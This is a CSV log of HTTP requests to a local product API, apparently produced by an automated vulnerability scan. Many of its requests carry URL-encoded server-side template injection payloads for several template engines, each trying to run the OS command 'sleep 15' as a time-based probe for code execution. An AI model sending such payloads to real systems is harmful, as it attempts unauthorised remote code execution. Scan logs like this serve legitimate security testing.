ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
6187,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,11,132,84
6188,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,9,132,85
6189,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,11,132,85
6190,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,9,132,93
6191,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,9,133,103
6192,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,8,133,129
6193,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,10,132,90
6194,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,8,132,98
6195,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6196,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6197,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6198,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,2,142,101
6199,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6200,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6201,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6202,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6203,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6204,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6205,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6206,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6207,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,2,142,101
6208,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6209,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081,404,Not Found,2,228,89
6210,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1,404,Not Found,6,228,91
6211,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,9,138,168
6212,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,10,133,147
6213,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product,405,Method Not Allowed,3,175,108
6214,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type,404,Not Found,5,106,0
6215,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,12,138,239
6216,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,15,133,218
6217,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,404,Not Found,8,106,0
6218,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,404,Not Found,7,106,0
6219,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,200,OK,14,134,3597
6220,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,13,138,177
6221,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,404,Not Found,7,106,0
6222,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,404,Not Found,10,106,0
6223,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,404,Not Found,7,106,0
6224,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,404,Not Found,4,106,0
6225,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,17,133,156
6226,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,15,138,176
6227,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,200,OK,17,134,3597
6228,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,404,Not Found,12,106,0
6229,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,404,Not Found,13,106,0
6230,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,11,138,173
6231,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,404,Not Found,7,106,0
6232,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,19,133,155
6233,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,404,Not Found,7,106,0
6234,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,200,OK,13,134,3597
6235,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,404,Not Found,5,106,0
6236,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,404,Not Found,6,106,0
6237,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,13,138,220
6238,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,404,Not Found,4,106,0
6239,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,404,Not Found,4,106,0
6240,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,11,133,152
6241,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E,200,OK,11,134,3657
6242,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,404,Not Found,7,106,0
6243,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,404,Not Found,7,106,0
6244,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,12,138,245
6245,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,404,Not Found,4,106,0
6246,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,404,Not Found,4,106,0
6247,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,200,OK,14,134,3657
6248,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,16,133,199
6249,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%25%3D%25x%28sleep+15%29%25%3E,404,Not Found,7,106,0
6250,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%3C%25%3D%25x%28sleep+15%29%25%3E,404,Not Found,7,106,0
6251,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,13,138,156
6252,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23%7B%25x%28sleep+15%29%7D,404,Not Found,7,106,0
6253,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%23%7B%25x%28sleep+15%29%7D,404,Not Found,9,106,0
6254,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,200,OK,15,134,3572
6255,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,18,133,224
6256,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7Bsystem%28%22sleep+15%22%29%7D,404,Not Found,10,106,0
6257,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/%7Bsystem%28%22sleep+15%22%29%7D,404,Not Found,11,106,0
6258,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,15,138,157
6259,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,200,OK,13,134,3572
6260,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,11,138,105
6261,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,17,133,135
6262,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,200,OK,12,134,3572
6263,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,11,138,103
6264,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,13,133,136
6265,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,200,OK,13,134,3287
6266,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,10,138,110
6267,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,15,132,84
6268,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,11,137,91
6269,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%3C%25%3D%25x%28sleep+15%29%25%3E,200,OK,16,134,3287
6270,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,10,137,91
6271,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,16,132,82
6272,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%23%7B%25x%28sleep+15%29%7D,200,OK,11,134,3287
6273,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,12,137,91
6274,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/MAIN?pageable=%7Bsystem%28%22sleep+15%22%29%7D,200,OK,14,134,3287
6275,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,19,132,89
6276,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D?pageable=,400,Bad Request,7,186,215
6277,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,16,137,91
6278,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D?pageable=,400,Bad Request,8,186,327
6279,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,9,137,91
6280,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,14,133,152
6281,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D?pageable=,400,Bad Request,7,186,226
6282,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%3C%25%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%25%3E?pageable=,400,Bad Request,6,186,225
6283,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,12,137,91
6284,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D?pageable=,400,Bad Request,6,186,218
6285,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,15,133,223
6286,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D?pageable=,400,Bad Request,8,186,285
6287,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,12,137,91
6288,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D?pageable=,400,Bad Request,5,186,310
6289,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,16,133,161
6290,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D?pageable=,400,Bad Request,7,186,197
6291,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,13,137,91
6292,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D?pageable=,400,Bad Request,6,186,200
6293,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%3C%25%3D%25x%28sleep+15%29%25%3E?pageable=,400,Bad Request,13,142,140
6294,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,21,133,160
6295,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,18,137,91
6296,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%23%7B%25x%28sleep+15%29%7D?pageable=,400,Bad Request,5,142,134
6297,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,10,137,91
6298,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,GET,http://localhost:8081/v1/product/type/%7Bsystem%28%22sleep+15%22%29%7D?pageable=,400,Bad Request,6,142,139
6299,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,15,133,157
6300,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,11,137,91
6301,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,13,133,204
6302,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,10,137,91
6303,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6304,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6305,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,14,133,229
6306,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,5,142,101
6307,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6308,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6309,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,11,133,140
6310,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6311,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6312,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6313,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6314,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,12,133,141
6315,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6316,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,4,142,101
6317,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,400,Bad Request,3,142,101
6318,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,11,132,89
6319,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,7,138,163
6320,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,10,132,87
6321,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,8,138,234
6322,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,10,132,94
6323,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,POST,http://localhost:8081/v1/product,201,Created,9,138,172
6324,Tue Jul 30 20:54:33 BRT 2024,Tue Jul 30 20:54:33 BRT 2024,PUT,http://localhost:8081/v1/product,200,OK,10,132,75
